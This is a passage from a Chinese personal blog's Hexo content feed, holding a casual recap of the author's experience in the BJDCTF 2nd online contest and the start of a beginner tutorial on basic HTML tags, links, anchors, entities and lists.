el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BJDCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF——赛后总结</title>
      <link href="/posts/bjd-2nd/"/>
      <url>/posts/bjd-2nd/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>这篇blog应该是昨天晚上写的，但是昨晚很累，打了三把游戏就去睡觉了2333</p><a id="more"></a><p>3月21日上午9点——3月22日晚上9点进行了第二届***BJDCTF***线上赛，说的是萌新赛，又是七校联盟（<strong>HUT</strong>… …七所</p><p>学校），我们就跟着参加了…</p><p><strong>// 下面是我这两天的“悲惨”经历 =_=</strong></p><h1 id="第一天"><a class="markdownIt-Anchor" href="#第一天"></a> 第一天</h1><p>第一天早上早早起来（8点多才下床），早饭没吃，就坐在电脑前面准备9点开始比赛，我怀着激动的心情，毕竟</p><p>第一次参加个人赛（之前跟着战队参加过团队赛），开机，打开Chrome、Opera，打开VMware检查网络（断过</p><p>1,2,3…次的网，数不清555），接着就水水群等着9点；</p><p>9点一到，一刷新页面。。。“404”。等到刷新好，签到题一血已经没了，然后我就观察了一波题目，当时题目只有</p><p>一部分，因为这个赛制，有些题目需要做出来另外的题目解锁（我快烦死）；不知如何下手当时，就直接开始从</p><p>pwn开始，第一个pwn题目（忍不住哇的一下就哭了）我到第二天晚上才会，也不能叫会，被大佬指引了一下方</p><p>向；感觉自己好菜好菜，自闭ing！</p><p>下午的时候仍然是做题不顺利，主要是一点思路都没有，Misc真的无能为力，只能抠一抠Crypto（本来主要学的</p><p>pwn) …好难过啊啊啊</p><p>晚上的时候看了看排行榜，我惊了！！！，前十的选手几乎都没做pwn和web，都在做Misc  //这委屈谁受得了</p><p>最搞笑的是，有人还在群里说，求求前十的大佬，做做pwn和web吧，哈哈哈哈笑了我半天；</p><p>临睡觉的时候看了看排名，前40，感觉不错，明天继续加油~~~</p><h1 id="第二天"><a class="markdownIt-Anchor" href="#第二天"></a> 第二天</h1><p>这天6点半就起来了，因为昨晚队友们都解答出了一道pwn/game的题目——贪吃蛇，据说玩游戏就可以有答案，</p><p>我没下床就开始玩，哈哈哈，找到了以前玩贪吃蛇的感觉了，但是玩了一局什么也没发现，就去看源码，喔喔，原</p><p>来如此（笑容逐渐 **）就做出来了，好开心；</p><p>然后接着又去网站做那道音乐题目，我卡，那道题真的是神仙题目，我现在脑子还在回放，循环听了几十遍，哎</p><p>呀，真的无语啊； // 感觉学音乐的一下子就能做出来；结果：结束比赛知道答案也弹不出来；</p><p>比赛还剩几个小时的时候，突然题目全部放出来了，太好了，正好有道题目我会，直接拿到了哈哈哈；</p><p>晚上8点钟的时候，我就没做了，自闭了做到最后，身心疲惫，直接去峡谷逛了几圈（/斜眼笑）</p><h1 id="结局"><a class="markdownIt-Anchor" href="#结局"></a> 结局</h1><p>比赛结束了，发挥得一般般吧，做出来的如下：（rank：14）</p><table><thead><tr><th style="text-align:center"><strong>Pwn</strong></th><th style="text-align:center">2</th></tr></thead><tbody><tr><td style="text-align:center"><strong>Web</strong></td><td style="text-align:center"><strong>0</strong></td></tr><tr><td style="text-align:center"><strong>Misc</strong></td><td style="text-align:center"><strong>3</strong></td></tr><tr><td style="text-align:center"><strong>Crypto</strong></td><td style="text-align:center"><strong>6</strong></td></tr><tr><td style="text-align:center"><strong>Reverse</strong></td><td style="text-align:center"><strong>1</strong></td></tr><tr><td style="text-align:center"><strong>Total</strong></td><td style="text-align:center"><strong>12</strong></td></tr></tbody></table><h1 id="总结与收获"><a class="markdownIt-Anchor" href="#总结与收获"></a> 总结与收获</h1><p>总的来说，这次比赛收获巨大，首先想说的是：出题人在哪，我给他们寄刀片…开个玩笑嘿嘿</p><p>还是自己太菜了，被出题人按在地上锤，┭┮﹏┭┮    自闭式打法可还行；</p><p>pwn题都是Linux？？！！好好的pwn你来个什么Linux，还在学习中不会做，也是，不能怪出题人，归根结底是</p><p>怪自己水平不够，没得办法；</p><p>Misc &amp; Crypto挺有意思，以后可以发展发展；</p><p>接下来有了学习目标了：</p><p><strong>1、尽快学堆</strong></p><p><strong>2、学隐写</strong></p><p><strong>3、继续学Crypto</strong></p><p><strong>4、还是得学Linux ，跑不了了</strong></p><p>.</p><p>.</p><p>.</p><p>.</p><p>长路漫漫，谁都想做大佬，继续加油，Fighting！！！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> summary </tag>
            
            <tag> BJDCTF </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML+CSS——基本用法</title>
      <link href="/posts/html-css/"/>
      <url>/posts/html-css/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>到目前为止，今年入的两个坑，一个是CTF，这个暂且不说，另一个是blog；</p><a id="more"></a><h1 id="前篇"><a class="markdownIt-Anchor" href="#前篇"></a> 前篇</h1><p>Blog这东西前面的文章也说了，很烦人其实，尤其是配置文件的时候，老是出错；最近看Hexo主题的时候又看上</p><p>了一个主题——Matery；这款主题页面清晰，画风很好，功能很多，想着就换了，但是因为不会前端的内容，里</p><p>面的好多东西，比如 JS 和 CSS 文件看不懂，导致博客页面老是出现bug，于是乎，哈哈哈，就有接下来的学了；</p><p>前端三件套 = HTML + CSS + JS；这些是web开发需要学的东西，非常好玩；</p><p>这篇博客就整理我的学习历程，先开始的HTML，所以先整理HTML；</p><h1 id="ide"><a class="markdownIt-Anchor" href="#ide"></a> IDE</h1><p>有人会问，编写前端这些代码需要什么IDE，其实这个不需要太大的IDE就行；最简单的是记事本，哈哈哈，没想</p><p>到吧；想着也是，把后缀改成html就行了，还可以用Notepad++；我也在网上找了几款，比如说像Vscode，</p><p>jetbrains公司的webstorm等等，这些都可以用，我也问了几个朋友，挑来挑去，咦~，发现了一款非常好的软件</p><p>——HBuilderX；</p><p>先说说它的好处，这款软件内存特别小，下载就几十MB，非常方便，它可以直接生成一个本地端口（应该算</p><p>是），就可以浏览你写的网页的样式；最重要的一个优点是，他可以代码补全，对于初学者来说，真的不错；</p><h1 id="html"><a class="markdownIt-Anchor" href="#html"></a> HTML</h1><h2 id="框架"><a class="markdownIt-Anchor" href="#框架"></a> 框架</h2><p>相信大家应该都看过网页源码，初学者可能会问html，总得有个框架吧？有的有的，下面来看：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>是不是看上去框架很复杂？yes/no ? 哈哈哈，这里就体现出HBuilderX的好处了，前面提到了，可以代码补全，当</p><p>然也可以直接把框架生成出来；</p><h2 id="简单编写"><a class="markdownIt-Anchor" href="#简单编写"></a> 简单编写</h2><p>先介绍一些最简单的用法吧；</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>...<span class="tag">&lt;/<span class="name">title</span>&gt;</span>   <span class="comment">&lt;!-- 网页标题 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>...<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>   <span class="comment">&lt;!-- 1级标题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>...<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>   <span class="comment">&lt;!-- 2级标题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>...<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>   <span class="comment">&lt;!-- 3级标题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>...<span class="tag">&lt;/<span class="name">h4</span>&gt;</span>   <span class="comment">&lt;!-- 4级标题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>...<span class="tag">&lt;/<span class="name">h5</span>&gt;</span>   <span class="comment">&lt;!-- 5级标题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>...<span class="tag">&lt;/<span class="name">h6</span>&gt;</span>   <span class="comment">&lt;!-- 6级标题 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>...<span class="tag">&lt;/<span class="name">p</span>&gt;</span>              <span class="comment">&lt;!-- 段落标签，文字会独占一行 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span>...<span class="tag">&lt;/<span class="name">i</span>&gt;</span>            <span class="comment">&lt;!-- 定义斜体字--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>...<span class="tag">&lt;/<span class="name">b</span>&gt;</span>          <span class="comment">&lt;!-- 定义粗体字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">big</span>&gt;</span>...<span class="tag">&lt;/<span class="name">big</span>&gt;</span>      <span class="comment">&lt;!-- 定义大号字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">small</span>&gt;</span>...<span class="tag">&lt;/<span class="name">small</span>&gt;</span>    <span class="comment">&lt;!-- 定义小号字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>...<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>  <span class="comment">&lt;!-- 定义加重字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span>...<span class="tag">&lt;/<span class="name">em</span>&gt;</span>         <span class="comment">&lt;!-- 定义着重字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sub</span>&gt;</span>...<span class="tag">&lt;/<span class="name">sub</span>&gt;</span>          <span class="comment">&lt;!-- 定义下标字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sup</span>&gt;</span>...<span class="tag">&lt;/<span class="name">sup</span>&gt;</span>          <span class="comment">&lt;!-- 定义上标字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ins</span>&gt;</span>...<span class="tag">&lt;/<span class="name">ins</span>&gt;</span>          <span class="comment">&lt;!-- 定义下划线 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">del</span>&gt;</span>...<span class="tag">&lt;/<span class="name">del</span>&gt;</span>          <span class="comment">&lt;!-- 定义删除字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>      <span class="comment">&lt;!-- 换行 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span>      <span class="comment">&lt;!-- 水平线 --&gt;</span></span><br><span class="line"><span class="symbol">&amp;nbsp;</span>      <span class="comment">&lt;!-- 网页上显示一个空格 --&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>看上去有点晕，那就来演示一遍</p><p>这是代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>2020.3.14<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>*测试标题效果*<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>*测试字体效果*<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello<span class="symbol">&amp;nbsp;</span>HTML!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">big</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">big</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">small</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">Hello<span class="tag">&lt;<span class="name">sub</span>&gt;</span> HTML!<span class="tag">&lt;/<span class="name">sub</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">Hello<span class="tag">&lt;<span class="name">sup</span>&gt;</span> HTML!<span class="tag">&lt;/<span class="name">sup</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ins</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">ins</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">del</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">del</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>看运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/html_1.jpg" alt="Test"></p><p>怎么样，是不是很有趣，nice！</p><h2 id="start"><a class="markdownIt-Anchor" href="#start"></a> Start</h2><p>基本操作就那么些些，现在看一些稍微高级一些的：</p><h3 id="插入图片"><a class="markdownIt-Anchor" href="#插入图片"></a> 插入图片</h3><p>实现代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"..."</span> <span class="attr">alt</span>=<span class="string">"..."</span> <span class="attr">title</span>=<span class="string">"..."</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>格式是这样，<strong>src</strong>里面写的是图片地址，这里你可以写绝对路径，也可以写相对路径（本使用本地图片时，要在HTML文件夹里新建一个文件夹，我使用的叫做<strong>img</strong>文件夹，把图片放进去）；<strong>alt</strong>里面写的是，当你的图片显示不出来（比如链接有问题…）显示的文字；<strong>title</strong>里面写的是，鼠标放在图片上显示的文字。</p></blockquote><p><strong>● 我用的本地引用，写法如下：</strong></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"../img/1.jpg"</span> <span class="attr">alt</span>=<span class="string">"Picture"</span> <span class="attr">title</span>=<span class="string">"This is a picture"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p><strong>● 如果用网上的图片地址，如下：</strong></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://..."</span> <span class="attr">alt</span>=<span class="string">"Picture"</span> <span class="attr">title</span>=<span class="string">"This is a picture"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>这是基本写法，也可以增加一些CSS，比如增加图片的大小：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"..."</span> <span class="attr">alt</span>=<span class="string">"..."</span> <span class="attr">title</span>=<span class="string">"..."</span> <span class="attr">width</span>=<span class="string">"..."</span> <span class="attr">height</span>=<span class="string">"..."</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="引入文件的地址路径"><a class="markdownIt-Anchor" href="#引入文件的地址路径"></a> 引入文件的地址路径</h3><h4 id="相对路径"><a class="markdownIt-Anchor" href="#相对路径"></a> 相对路径</h4><p><strong>.  在路径中表示当前路径</strong></p><p><strong>… 在路径中表示上一级路径</strong></p><p>通俗来讲  就是  该文件和新建的**.html**文件是否在同一级路径</p><h4 id="绝对路径"><a class="markdownIt-Anchor" href="#绝对路径"></a> 绝对路径</h4><p>绝对路径就基本不受控制了，它不会看你的本地文件，只会去找你引进文件的这个地址.</p><h3 id="跳转链接"><a class="markdownIt-Anchor" href="#跳转链接"></a> 跳转链接</h3><p>这种是最简单的形式：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com"</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>加点样式：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"../img/1.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>这样引用一张图片，就会生成一张可以跳转链接的图片；target="_blank"这个是当点击图片时，就会新建一个窗口打开链接（target有很多样式）</p></blockquote><p>如果在html文件中需要很多的新建窗口这种样式，每一个都写target不太方便，这里可以在***&lt; head &gt;&lt; /head &gt;***里面添加如下一句话：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="跳转锚点"><a class="markdownIt-Anchor" href="#跳转锚点"></a> 跳转锚点</h3><p>跳转锚点就是在网页点击一个链接，会跳转到该网页的对应位置；</p><h4 id="实现方法1"><a class="markdownIt-Anchor" href="#实现方法1"></a> 实现方法1</h4><p><em><strong>●  符号 —&gt; #</strong></em></p><p><em><strong>●  id 属性</strong></em></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#..."</span>&gt;</span>...<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"..."</span>&gt;</span>...<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p><em><strong>#</strong></em> 后面的内容与 <em><strong>id</strong></em> 里面的保持一致</p></blockquote><h4 id="实现方法2"><a class="markdownIt-Anchor" href="#实现方法2"></a> 实现方法2</h4><p><em><strong>●  符号 —&gt; #</strong></em></p><p><em><strong>●  name 属性（name属性加给的是a标签）</strong></em></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#..."</span>&gt;</span>...<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">"..."</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p><em><strong>#</strong></em> 后面的内容与 <em><strong>name</strong></em> 里面的保持一致</p><p>点击链接时会跳转到***“name”***的下一行</p></blockquote><h3 id="特殊符号"><a class="markdownIt-Anchor" href="#特殊符号"></a> 特殊符号</h3><table><thead><tr><th style="text-align:center"><strong>特殊字符</strong></th><th style="text-align:center"><strong>含义</strong></th><th style="text-align:center"><strong>代码</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>&nbsp;</strong></td><td style="text-align:center"><strong>空格符</strong></td><td style="text-align:center"><strong>&amp; nbsp；</strong></td></tr><tr><td style="text-align:center"><strong>©</strong></td><td style="text-align:center"><strong>版权</strong></td><td style="text-align:center"><strong>&amp; copy；</strong></td></tr><tr><td style="text-align:center"><strong>®</strong></td><td style="text-align:center"><strong>注册商标</strong></td><td style="text-align:center"><strong>&amp; reg；</strong></td></tr><tr><td style="text-align:center"><strong>&gt;</strong></td><td style="text-align:center"><strong>大于号</strong></td><td style="text-align:center"><strong>&amp; gt；</strong></td></tr><tr><td style="text-align:center"><strong>&lt;</strong></td><td style="text-align:center"><strong>小于号</strong></td><td style="text-align:center"><strong>&amp; lt；</strong></td></tr><tr><td style="text-align:center"><strong>&amp;</strong></td><td style="text-align:center"><strong>和号</strong></td><td style="text-align:center"><strong>&amp; amp；</strong></td></tr><tr><td style="text-align:center"><strong>¥</strong></td><td style="text-align:center"><strong>人民币</strong></td><td style="text-align:center"><strong>&amp; yen；</strong></td></tr><tr><td style="text-align:center"><strong>°</strong></td><td style="text-align:center"><strong>摄氏度</strong></td><td style="text-align:center"><strong>&amp; deg；</strong></td></tr></tbody></table><blockquote><p>这里需要注意的是代码的**&amp;<strong>和</strong>右边的字母**中间没有空格（因为语法问题，这里不打空格就会变成符号了2333）</p></blockquote><h3 id="列表"><a class="markdownIt-Anchor" href="#列表"></a> 列表</h3><h4 id="无序列表"><a class="markdownIt-Anchor" href="#无序列表"></a> 无序列表</h4><p>实现代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>...<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>进一步升级：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span>=<span class="string">"..."</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>...<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>type里面写属性，如下所示：</p></blockquote><table><thead><tr><th style="text-align:center"><strong>值</strong></th><th style="text-align:center"><strong>样式</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>disc</strong></td><td style="text-align:center"><strong>实心圆（默认）</strong></td></tr><tr><td style="text-align:center"><strong>circle</strong></td><td style="text-align:center"><strong>空心圆</strong></td></tr><tr><td style="text-align:center"><strong>aquare</strong></td><td style="text-align:center"><strong>实心方块</strong></td></tr></tbody></table><h4 id="有序列表"><a class="markdownIt-Anchor" href="#有序列表"></a> 有序列表</h4><p>实现代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>...<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span 